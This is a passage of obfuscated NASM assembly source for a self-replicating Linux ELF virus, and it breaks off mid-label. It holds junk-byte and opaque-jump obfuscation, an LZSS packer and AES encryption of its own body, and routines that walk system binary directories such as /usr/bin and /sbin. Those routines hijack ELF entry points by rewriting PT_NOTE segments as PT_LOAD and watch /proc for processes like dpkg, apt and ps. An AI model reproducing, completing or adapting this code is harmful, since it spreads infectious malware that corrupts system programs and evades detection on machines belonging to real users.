db 0xd8
    jmp         $+5
db 0x06, 0xda, 0xdb
    js          ..@qrr4ktoZBnKr
    jns         ..@qrr4ktoZBnKr
..@Ku5B6dWS5apR:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    jl          ..@6PAhgf4iMBph
    jge         ..@6PAhgf4iMBph
..@2FQ9RSc9G2Aj:
    mov         rcx, 8
    js          ..@V0qnIROKemU3
    jns         ..@V0qnIROKemU3
..@NqBzcd3phEHl:
    mov         BYTE [rbx], al
    jmp         $+4
db 0xfc, 0x6d
    jb          ..@XTg6FaSm9sML
    jae         ..@XTg6FaSm9sML
..@uWt1H9XUInvR:
    mov         rcx, LENGTH_BITS
    call        ..@qKzlg1hR1mkh
    add         rax, 1
    jmp         ..@nCFX9PF1aSHW
..@WxO65EoZlUSx:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+3
db 0x84
    jmp         ..@iD0RcCTJ9Acf
..@mfj3q8RGZHne:
    test        dl, dl
    jmp         ..@xyyWex9FPdbf
..@3KRVqCi9RbBP:
    xor         r1, r1
    xor         r2, r2
    jb          ..@adbRWBul2tSE
    jae         ..@adbRWBul2tSE
..@v3wWVD2jKqjd:
    xor         rdi, rdi
    jmp         ..@MKoNm0eOkOII
..@RS01OSskG3js:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+4
db 0xca, 0x27
    je          ..@gmfLyx6WOkab
    jne         ..@gmfLyx6WOkab
..@o0Gom0Tm8f3y:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    jnz         ..@9jY5MYE4JCPN
    jmp         $+4
db 0xf9, 0xe6
    jmp         ..@RmFcZXRMXh8J
..@ix7guZkTXE86:
%ifdef X86_64
    mov         r10, 0x22
%endif
    jmp         $+5
db 0xcd, 0xeb, 0xe6
    jl          ..@WAkFO3cEQhRz
    jge         ..@WAkFO3cEQhRz
..@r3RPGXTkiBx4:
    GGLOBAL     _packed
    mov         r1, r5
    jmp         ..@mRYpisnZtEw7
..@mv9vMHKfEv2l:
    jmp         ..@j1XNNuH9Nbcy
    jmp         $+3
db 0xdd
    jmp         ..@qKzlg1hR1mkh
..@RMsbyGIEzKXb:
    xor         rax, rax
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    mov         r2, original_virus_len-non_packed_len
    jmp         $+3
db 0xa5
    jmp         $+3
db 0xf6
    jl          ..@eN3vcBm3YcdU
    jge         ..@eN3vcBm3YcdU
..@OHSLXg5PwCqf:
    rep         stosb
    jmp         $+3
db 0x0b
    jb          ..@rQXGNken7E3S
    jae         ..@rQXGNken7E3S
..@MS6OLYcldIVN:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    jmp         $+3
db 0x20
    jmp         ..@2i89LP47O8Jw
..@svgrEESjrNMv:
    syscall
    jmp         ..@AIecPdC10Dva
..@SxPQbfLL4sAm:
    mov         r2d, DWORD [r5]
    sub         r2, non_packed_len
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    je          ..@kxKbBGjvcYK8
    jne         ..@kxKbBGjvcYK8
..@rN7DYxs7of4m:
%ifdef X86_64
    mov         edx, 111b
%endif
    jmp         ..@ix7guZkTXE86
..@gcCGAVOTJG8q:
    call        rax
    jmp         $+3
db 0xdd
    jmp         $+3
db 0x45
    jl          ..@RMsbyGIEzKXb
    jge         ..@RMsbyGIEzKXb
..@LosgZDE1AdQj:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    mov         m8, rax
    jmp         $+3
db 0x9f
    jl          ..@gcCGAVOTJG8q
    jge         ..@gcCGAVOTJG8q
..@nCFX9PF1aSHW:
    mov         rdx, rax
    js          ..@E8nzJWdD2UEJ
    jns         ..@E8nzJWdD2UEJ
..@bfnJ13Z2c8ph:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mov         BYTE [rbx], al
    je          ..@UXitDDn3jOC4
    jne         ..@UXitDDn3jOC4
..@ZyUfZJ4fjELP:
%ifdef X86_64
    xor         r9, r9
    mov         esi, original_virus_len-non_packed_len
%endif
    jmp         $+3
db 0xf4
    jmp         $+4
db 0x49, 0xf1
    jmp         $+4
db 0xfc, 0x9d
    jmp         $+4
db 0x5e, 0x9b
    jmp         $+5
db 0x5a, 0x46, 0x65
    jb          ..@rN7DYxs7of4m
    jae         ..@rN7DYxs7of4m
..@cBWl3qj1awYa:
    jnz         ..@o0Gom0Tm8f3y
    js          ..@wiYwr3XueMNt
    jns         ..@wiYwr3XueMNt
..@mRYpisnZtEw7:
    GGLOBAL     virus_len
    jmp         $+3
db 0xc2
    jl          ..@lOrRXoUkLmNa
    jge         ..@lOrRXoUkLmNa
..@lOrRXoUkLmNa:
    xor         r2, r2
    je          ..@SxPQbfLL4sAm
    jne         ..@SxPQbfLL4sAm
..@E4BS6JBxYmwO:
    xor         rdi, rdi
    jmp         $+3
db 0xc6
    jmp         $+4
db 0x87, 0xb6
    jmp         ..@ZYPbCb8hawSs
..@HsUc5vXsnmAL:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    jmp         $+4
db 0xde, 0x0b
    jmp         $+5
db 0x52, 0xeb, 0x9d
    js          ..@9jY5MYE4JCPN
    jns         ..@9jY5MYE4JCPN
..@uDEIymrHnCld:
    call        ..@qKzlg1hR1mkh
    mov         rsi, rax 
    jmp         $+4
db 0x75, 0xb7
    jmp         $+4
db 0x3f, 0x35
    jl          ..@uWt1H9XUInvR
    jge         ..@uWt1H9XUInvR
..@ZYPbCb8hawSs:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jl          ..@NqBzcd3phEHl
    jge         ..@NqBzcd3phEHl
..@E8nzJWdD2UEJ:
    xor         rax, rax
    js          ..@dkluXeJIpYpw
    jns         ..@dkluXeJIpYpw
..@rXdBLKmgca1P:
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    jmp         $+4
db 0xff, 0x42
    jb          ..@bfnJ13Z2c8ph
    jae         ..@bfnJ13Z2c8ph
..@iz8pzRzCXh97:
    mov         rcx, 1
    jmp         ..@IzbPXxIFxO2w
..@zjXZd59ZoiUd:
    ret
    jmp         $+3
db 0xc6
    js          ..@j1XNNuH9Nbcy
    jns         ..@j1XNNuH9Nbcy
..@aHPspa2MdVb8:
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    js          ..@8jMMzUDErvvW
    jns         ..@8jMMzUDErvvW
..@kxKbBGjvcYK8:
    call        LzssDecoder
    jmp         $+4
db 0x59, 0x3d
    je          ..@LosgZDE1AdQj
    jne         ..@LosgZDE1AdQj
..@2i89LP47O8Jw:
%ifdef X86_32
    push        ebp
    xor         ebp, ebp
%endif
    je          ..@Ku5B6dWS5apR
    jne         ..@Ku5B6dWS5apR
..@IzbPXxIFxO2w:
    call        ..@qKzlg1hR1mkh
    jb          ..@n06IhGPXHklB
    jae         ..@n06IhGPXHklB
..@WAkFO3cEQhRz:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
    mov         eax, SYS_MMAP
    syscall
%endif
    jmp         $+3
db 0xb4
    js          ..@cI6Rx8Df5IJx
    jns         ..@cI6Rx8Df5IJx
..@qrr4ktoZBnKr:
    xor         rbx, rbx
    jmp         $+3
db 0x69
    jmp         $+3
db 0xc9
    je          ..@o0Gom0Tm8f3y
    jne         ..@o0Gom0Tm8f3y
..@XTg6FaSm9sML:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+4
db 0x72, 0x4a
    jmp         ..@RS01OSskG3js
..@hziJXji6NTQO:
    xor         rdi, rdi
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+4
db 0x74, 0x43
    jmp         $+5
db 0xd0, 0x5a, 0x93
    jmp         ..@WxO65EoZlUSx
..@AIecPdC10Dva:
    sub         rsp, _UEC_OFF_size
    jmp         ..@HP58mP2wigW5
..@iD0RcCTJ9Acf:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    js          ..@tJlEk9dF71LA
    jns         ..@tJlEk9dF71LA
..@msHIXNbDwd1A:
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    jmp         $+4
db 0xe8, 0x39
    je          ..@klyN6F3WBgqd
    jne         ..@klyN6F3WBgqd
..@adbRWBul2tSE:
    xor         r3, r3
    jmp         $+4
db 0xf7, 0x04
    jb          ..@P5gmmmDn6eHx
    jae         ..@P5gmmmDn6eHx
..@bUUOGchOKGTe:
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    js          ..@mfj3q8RGZHne
    jns         ..@mfj3q8RGZHne
..@klyN6F3WBgqd:
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    dec         QWORD [rsp+_LZSSD_OFF.length]
    jmp         $+4
db 0x2f, 0x7f
    jmp         ..@HsUc5vXsnmAL
..@5dpSFR8Ti91D:
    sub         rcx, 1
    jb          ..@cBWl3qj1awYa
    jae         ..@cBWl3qj1awYa
..@HP58mP2wigW5:
    call        ExitProgram
    jmp         $+5
db 0xeb, 0x49, 0xa1
    jmp         $+5
db 0x9a, 0xe2, 0xa6
    jmp         $+4
db 0xcc, 0xeb
    jmp         $+3
db 0xf1
    jmp         $+4
db 0x7d, 0xff
    jmp         LzssDecoder
..@eN3vcBm3YcdU:
    mov         rax, SYS_MUNMAP
    js          ..@svgrEESjrNMv
    jns         ..@svgrEESjrNMv
..@MKoNm0eOkOII:
    mov         rbx, rsi
    add         bx, cx
    and         bx, WINDOW_LENGTH-1
    jmp         $+4
db 0xed, 0xa5
    jmp         ..@rXdBLKmgca1P
..@9jY5MYE4JCPN:
    shl         eax, 1
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    jmp         $+5
db 0x1b, 0x5b, 0x48
    jmp         $+5
db 0x71, 0x51, 0x55
    jmp         ..@bUUOGchOKGTe
..@V0qnIROKemU3:
    call        ..@qKzlg1hR1mkh
    jmp         $+5
db 0xe8, 0x17, 0x9f
    jmp         $+3
db 0x3e
    js          ..@E4BS6JBxYmwO
    jns         ..@E4BS6JBxYmwO
..@xyyWex9FPdbf:
    jz          ..@EJ3YXVCJAtMy
    or          eax, 1
    jmp         $+5
db 0x20, 0xeb, 0xdc
    jmp         $+5
db 0x86, 0x1e, 0x16
    jl          ..@EJ3YXVCJAtMy
    jge         ..@EJ3YXVCJAtMy
..@j1XNNuH9Nbcy:
    add         rsp, _LZSSD_OFF_size
    ret
    jmp         $+3
db 0x3a
    jmp         $+4
db 0x7a, 0x26
..@rQXGNken7E3S:
    jmp         ..@iz8pzRzCXh97
    jmp         $+3
db 0xa4
    jmp         $+4
db 0xda, 0xc6
    jb          ..@ioS3Vr8r9ZDg
    jae         ..@ioS3Vr8r9ZDg
..@UXitDDn3jOC4:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    jl          ..@hziJXji6NTQO
    jge         ..@hziJXji6NTQO
..@48HCIrrA8aOt:
    jle         ..@MKoNm0eOkOII
    je          ..@iz8pzRzCXh97
    jne         ..@iz8pzRzCXh97
..@wiYwr3XueMNt:
    push        rdi
    jmp         $+5
db 0xa8, 0x4c, 0x82
    js          ..@zjXZd59ZoiUd
    jns         ..@zjXZd59ZoiUd
..@Z3TEXfAGEF7q:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    jmp         $+5
db 0xcc, 0xe5, 0x6c
    je          ..@aHPspa2MdVb8
    jne         ..@aHPspa2MdVb8
LzssDecoder:
    jmp         ..@lb5te3GuSJ0C
..@atmx05tKxyU4:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+5
db 0xea, 0xbd, 0x1c
    jmp         ..@ZyUfZJ4fjELP
..@Ht0jDWdUPh6Q:
    xor         rax, rax
    jmp         $+3
db 0xde
    jmp         $+5
db 0xf0, 0x0b, 0x98
    jmp         ..@3KRVqCi9RbBP
..@tJlEk9dF71LA:
    add         ecx, 1
    cmp         cl, dl
    jmp         $+4
db 0xed, 0xaf
    jb          ..@48HCIrrA8aOt
    jae         ..@48HCIrrA8aOt
..@EJ3YXVCJAtMy:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    jmp         $+3
db 0xc2
    jmp         ..@5dpSFR8Ti91D
..@gpuSohsNxHFm:
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jmp         $+5
db 0x59, 0x6c, 0xe2
    jl          ..@sG8TjhcsPwEO
    jge         ..@sG8TjhcsPwEO

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp         Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _MUTA_OFF
    .start      resq 0x1
    .index      resd 0x1
    .size       resd 0x1
    .key        resq 0x1
    .random_BYTE resb 0x1
endstruc
struc _AESE_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
    .keyprev    resd 0x1
    .meta_ptr   resq 0x1
endstruc
struc _KEYGEN_OFF
    .bufferaddr resq 0x1
    .fd         resd 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs: 
proc6:      db "dpkg", 0
proc5:      db "apt", 0
proc4:      db "ps", 0
proc3:      db "grep", 0
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

bash:       db "/bin/bash", 0
urandom:    db "/dev/urandom", 0

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@UuBHt6vu6Igq
..@7jcSSMGok97H:
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    jmp         $+5
db 0xa8, 0x46, 0x8a
    jmp         $+4
db 0x66, 0x38
    jmp         ..@G5q9VY0DWRjY
..@nnRX4QlFPhKo:
    mov         r2, 1b
    jmp         $+4
db 0xd7, 0xbd
    jmp         ..@ebfKTHMHODNY
..@jlruGh2Nm2EC:
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    jmp         $+4
db 0x9b, 0x56
    je          ..@KCZSptnQ6uy7
    jne         ..@KCZSptnQ6uy7
..@rv9SFBVslfCY:
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    rep         movsb
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    jmp         $+5
db 0x37, 0x24, 0x1a
    jmp         ..@FKnjNuq0hxeG
..@jf20FNdzqHka:
    xor         rcx, rcx
    jmp         $+4
db 0x7a, 0x9b
    jmp         $+3
db 0xe3
    jmp         ..@PC9wVMOh854w
..@9mZbf0RonqHb:
    sub         rsp, _PAYLOAD_OFF_size
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    jmp         $+5
db 0x38, 0x59, 0xb5
    jmp         ..@QsH7RXLyCEiZ
..@XVD770GOcQKq:
    mov         r1, rsp
    add         r1, bytes
    js          ..@bJqi3pxaK8hS
    jns         ..@bJqi3pxaK8hS
..@OYbPqaIvS9iU:
    jl          ..@Ck8Hg0xJL4xE
    leave
    ret
    jmp         $+4
db 0xa0, 0x27
    jmp         LzssEncoder
..@m7LMEZ47O9MO:
    push        r3
    jmp         $+4
db 0x8e, 0xe6
    jmp         ..@eAK7tYEyZvZV
..@0nJSn71GvLdu:
    sub         rsp, _DYNPIE_OFF_size
    jmp         ..@ljwPBZNIprLM
..@I3pa1quXp4Ou:
    xor         rcx, rcx
    js          ..@ON5Srlwp6ots
    jns         ..@ON5Srlwp6ots
..@migVR7dNabyO:
    mov         DWORD [r2], PT_LOAD
    mov         QWORD [r1+e_h.e_entry], r3
    or          QWORD [r1+e_h.e_entry], 1b
    jmp         ..@hqd3J1gDwSWb
..@4jJo0Jm9rdUZ:
    jl          ..@5nos5Ui09qPo
    mov         r4, r5
    jmp         $+4
db 0x2c, 0x0d
    jl          ..@PfL7PbrDgOTa
    jge         ..@PfL7PbrDgOTa
..@1cBKUgg6w9Eh:
    ret
    jb          GetNewProgramVaddr
    jae         GetNewProgramVaddr
..@I3prJZJqa8Xm:
    mov         QWORD [r5+file.fileptr], rax
    mov         QWORD [r5+file.filesize], r3
    jmp         ..@t14R8aED5IcG
    jl          ..@5V6OC7Le1QBK
    jge         ..@5V6OC7Le1QBK
..@zCNtRHLgoy8e:
    call        LzssEncoder
    mov         rdi, m6
    add         rdi, non_packed_len
    jmp         ..@Wv8E0DLd3QaH
..@f4pDnaauLWvC:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
%endif
    jmp         ..@o7fuAg9CBU8x
..@iByXN6FToFPH:
    syscall
    js          ..@TE3igxxJViwn
    jns         ..@TE3igxxJViwn
..@Z8pcSD4thL7H:
    mov         QWORD [r2+p_h.p_paddr], r3
    jb          ..@UHd7JOZ9SmJd
    jae         ..@UHd7JOZ9SmJd
..@bqqYB0W6vJBt:
%ifdef X86_32
    mov         edi, DWORD [edi+file.filefd]
%endif
    jmp         $+3
db 0x09
    jmp         $+3
db 0x47
    jmp         $+4
db 0x48, 0xf5
    js          ..@WanNv4PoainN
    jns         ..@WanNv4PoainN
..@E2I4fQWwweme:
    mov         r1, r5
    jb          ..@zIrX3GfHIvJv
    jae         ..@zIrX3GfHIvJv
..@xadAPfonX6Gt:
    add         r5, 1
    jmp         ..@E2I4fQWwweme
    jmp         $+5
db 0xa0, 0x76, 0x97
    jmp         ..@mOCnibGWj68Q
IsELFComplete:
    jmp         ..@2mNgUDMEfWu7
..@ZjLa5WY9jKdJ:
    mov         QWORD [r5+file.fileptr], 0x00
    jmp         ..@kLBmOIaYnFQP
..@kTAiUISVsAxb:
    pop         r1
    ret
    jmp         $+3
db 0x18
    jmp         $+3
db 0x02
    jl          IsELFComplete
    jge         IsELFComplete
..@W9LVa3izKPNU:
    xor         rax, rax
    jmp         $+3
db 0x8f
    jmp         $+3
db 0x55
    jmp         $+3
db 0x6b
    js          ..@pMgvKqejkcE7
    jns         ..@pMgvKqejkcE7
..@zymOeYpooDw8:
    mov         BYTE [rdi], al
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+4
db 0x3d, 0x05
    js          ..@A3CD3lQZQvuJ
    jns         ..@A3CD3lQZQvuJ
..@Ps4BktGfRkcR:
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    jb          ..@koI9NWxp30uS
    jae         ..@koI9NWxp30uS
..@qa9HoFX9mW7H:
    jmp         ..@VugmyxpEj1I0
    jb          ..@ByeErte1WBwT
    jae         ..@ByeErte1WBwT
..@G5q9VY0DWRjY:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    js          ..@iQGWnTitAKLa
    jns         ..@iQGWnTitAKLa
..@ttpuscEZiuva:
    jz          ..@RwzwiGMb79T0
    add         r4, r3
    add         r4, 1
    jmp         $+5
db 0x65, 0x92, 0x69
    jmp         ..@rXdLlWgUOASc
..@t14R8aED5IcG:
    pop         r5
    jmp         $+3
db 0xc2
    jmp         ..@kCEhUyuLxwm5
..@ztGvitWaDAJT:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
%endif
    jb          ..@2OEPjeS3JBVD
    jae         ..@2OEPjeS3JBVD
..@up5F1XqyTjE9:
    cmp         DWORD [r2+rax], PT_NOTE
    jne         ..@xFBje5Sfiejf
    add         r2, rax
    jl          ..@73hdwgDD4gAw
    jge         ..@73hdwgDD4gAw
..@Pi9il7D8vvw0:
    ret
    je          ..@xpc5QenzkoUe
    jne         ..@xpc5QenzkoUe
..@jcjeTn6XFT8Q:
    cmp         eax, 0x3
    jmp         ..@akTaSm8HoHP8
..@gbV5O3R6uNri:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jb          ..@b9ngManeWEQO
    jae         ..@b9ngManeWEQO
..@QEjHGjLfaNqK:
    xor         rax, rax
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    jmp         ..@sbWvbQN1c6Gs
..@uZVxEykDyzDX:
    or          bx, ax
    jmp         $+4
db 0x9d, 0x68
    jmp         $+3
db 0x63
    je          ..@kUzayClRhg3e
    jne         ..@kUzayClRhg3e
..@jZE0KbF56hLX:
    sub         rcx, rax
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    js          ..@skZikvD2cfwV
    jns         ..@skZikvD2cfwV
..@pw8FrdatDLbj:
%ifdef X86_32
    mov         esi, r2
    mov         ecx, r3
%endif
    jmp         ..@9mA5QqxaeTBV
..@cHTJe4ej60Ev:
    movdqu      xmm1, oWORD [rsp+0xc0]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xd0]
    jmp         $+5
db 0xc9, 0x42, 0xcf
    jmp         $+3
db 0x4f
    jb          ..@4wlDrouzmB9K
    jae         ..@4wlDrouzmB9K
..@lwa9BAfMjhyJ:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    cmp         BYTE [r1], '.'
    je          ..@qFCKTajb7Cpo
    jmp         ..@urDk7YLtSv2d
..@izSY2JikoNCD:
    sub         rsp, _VADDR_OFF_size
    jmp         $+3
db 0x1e
    jmp         ..@7jcSSMGok97H
..@OuqhE60pPqYS:
    jle         ..@IzGteyu0sii7
    mov         rax, rsp
    jmp         $+3
db 0xba
    jmp         $+3
db 0x24
    jmp         $+3
db 0x67
    js          ..@gT0ycgOibCRv
    jns         ..@gT0ycgOibCRv
..@3KHkA8TxcJpr:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_SOCKET
%endif
    jmp         $+3
db 0x8b
    js          ..@uECKu6hbDK6w
    jns         ..@uECKu6hbDK6w
..@3s9EtEQOm3eM:
    push        r1
    push        r2
    jmp         $+3
db 0xa1
    jb          ..@Si355ed2dJvv
    jae         ..@Si355ed2dJvv
..@chdJhINwdCFA:
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    jmp         $+3
db 0x80
    jmp         $+5
db 0x02, 0xad, 0x32
    jmp         $+5
db 0xb8, 0xfe, 0xa4
    jmp         $+5
db 0x0d, 0x79, 0x70
    jmp         ..@0SMFHLSsJnNF
..@LVpY1clpA6UL:
    mov         r3d, 0x02
    mov         eax, SYS_LSEEK
    jmp         $+5
db 0xc0, 0x72, 0x4e
    jmp         $+5
db 0x8f, 0x6a, 0x63
    jmp         ..@veuOBaGI7J81
..@Op3AO1zqJ53o:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         ..@0m9SdhUu0WFT
..@26npGSyeVEvR:
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    jl          ..@QEjHGjLfaNqK
    jmp         ..@tRmiCNu3ltr7
    jmp         $+3
db 0x7f
    jmp         $+3
db 0xd8
    js          ..@4fjQJKwYvnpd
    jns         ..@4fjQJKwYvnpd
..@LOed8AQdIO3X:
    jmp         ..@eAXlBhhBYsxt
    jmp         $+3
db 0x74
    jmp         ..@GZajGxd8TeMx
..@Slyk81HOZs7n:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    cmp         bx, WORD [rsi+e_h.e_shnum]
    jmp         $+4
db 0x33, 0x72
    jmp         $+4
db 0xaf, 0xbb
    js          ..@nlvHNFCj64YV
    jns         ..@nlvHNFCj64YV
..@SyM7eZlcX2dK:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jmp         ..@hnV5Rax65Fqi
..@bBhVSLY7hHTp:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    mov         eax, 0x20
    jmp         $+4
db 0x30, 0x90
    jmp         $+5
db 0x13, 0xc1, 0xfd
    jmp         $+4
db 0xd9, 0xa2
    js          ..@Quxudai11mYa
    jns         ..@Quxudai11mYa
..@l2HbiBzdQBN3:
    jge         ..@iUaD78RveJ6I
    jmp         ..@GniwPQZovoJK
..@PHQvbSsP92QI:
    cmp         BYTE [r5], DT_DIR
    jmp         $+3
db 0x42
    jmp         ..@ocOJbrN16luh
..@JTITGlwcFIPr:
    lea         rsi, [rsp+_PAYLOAD_OFF.key]
    jmp         $+5
db 0x37, 0x41, 0x60
    jmp         ..@kbnYt8Cp5h5F
..@ByeErte1WBwT:
    xor         rax, rax
    jmp         ..@HoC4IJJRFye6
..@m4n9BhBeAwJk:
    jne         ..@bYBwyrVMkoY7
    mov         r2, QWORD [r5+file.fileptr]
    GGLOBAL     _signature
    jmp         $+3
db 0xee
    jb          ..@1zqJF0DloWJb
    jae         ..@1zqJF0DloWJb
..@Z7LQ8HuwKBBj:
%ifndef ENABLE_DEBUGGING
    jge         ..@lTeycR7SxrQW
    xor         rax, rax
%endif
    jmp         $+4
db 0x4f, 0x85
    je          ..@TDtEs2bxGR0J
    jne         ..@TDtEs2bxGR0J
..@6kUWSUeNATRJ:
    sub         rsp, _UPDATASIG_OFF_size
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    jmp         $+4
db 0xaf, 0x3c
    jmp         $+5
db 0xad, 0x72, 0x4f
    jmp         ..@LHT4iQucKy1J
..@FKnjNuq0hxeG:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    jmp         $+3
db 0xfa
    jb          ..@E2kxgvVvDGea
    jae         ..@E2kxgvVvDGea
..@Tjz5QpOnJmYp:
    jnz         ..@wFC8XXSzHOhP
    jb          ..@X9ySHtW3TjNw
    jae         ..@X9ySHtW3TjNw
..@ijXWS2PmNgTQ:
    mov         r5, [rsp+_NBF_OFF.file]
    jmp         $+5
db 0x8f, 0x65, 0x37
    jmp         $+3
db 0x88
    jl          ..@MObPOj3xQcpZ
    jge         ..@MObPOj3xQcpZ
..@p9Cw54kxPSbr:
    call_vsp    ExitProgram
    jb          ..@9EZ4PsXPjqTU
    jae         ..@9EZ4PsXPjqTU
..@YvPMJhKOhnEG:
    je          ..@8QAXba70U4wC
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    jmp         $+5
db 0x12, 0x4d, 0x99
    jmp         $+4
db 0x77, 0xf5
    jmp         ..@BacsqXzCGNmY
..@2g76VzwZFsBO:
    xor         r1, r1
    jb          ..@z2l7iiHDYwWS
    jae         ..@z2l7iiHDYwWS
..@hhi0At476Dzy:
    syscall
    jmp         ..@6eG625dUx27k
..@yKs6oHP7YsBE:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         $+5
db 0x32, 0x1c, 0xaf
    je          ..@I3pa1quXp4Ou
    jne         ..@I3pa1quXp4Ou
..@q6MQNBHFPSYH:
%ifndef ENABLE_DEBUGGING
    jl          ..@gMdfoIlYoobW
%endif
    jmp         ..@YFqlXxg84I5w
..@wnsOuULZFzaF:
    add         rax, r1
    pop         r1
    jmp         $+4
db 0xd4, 0xc5
    jl          ..@QIuZVCQUi13p
    jge         ..@QIuZVCQUi13p
..@8J4N4kapwUeq:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_WAIT4
    syscall
%endif
    jb          ..@zpbCSuwe9srt
    jae         ..@zpbCSuwe9srt
..@AxxakbncRyLY:
    je          ..@qFCKTajb7Cpo
    jmp         $+3
db 0x6f
    jb          ..@WePxXRYY7WIS
    jae         ..@WePxXRYY7WIS
..@W8W29FbY4egT:
